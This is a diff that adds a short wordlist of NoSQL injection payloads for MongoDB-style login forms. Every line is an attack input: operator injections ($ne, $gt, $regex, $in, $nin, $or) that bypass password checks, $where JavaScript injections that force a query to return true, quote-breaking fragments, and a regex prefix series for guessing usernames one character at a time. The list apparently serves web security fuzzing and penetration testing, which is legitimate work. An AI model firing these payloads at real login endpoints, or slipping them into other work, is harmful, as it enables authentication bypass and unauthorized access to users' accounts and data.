@@ -1,0 +1,16 @@
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}
+{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+{"$where": "this.username == 'admin'"}
+{"$where": "function() { return true; }"}
+{"username": {"$regex": "^a"}}
+{"username": {"$regex": "^ad"}}
+{"username": {"$regex": "^adm"}}
+{"username": {"$nin": ["invalid"]}, "password": {"$nin": ["invalid"]}}
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+'; return '' == '
+{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}
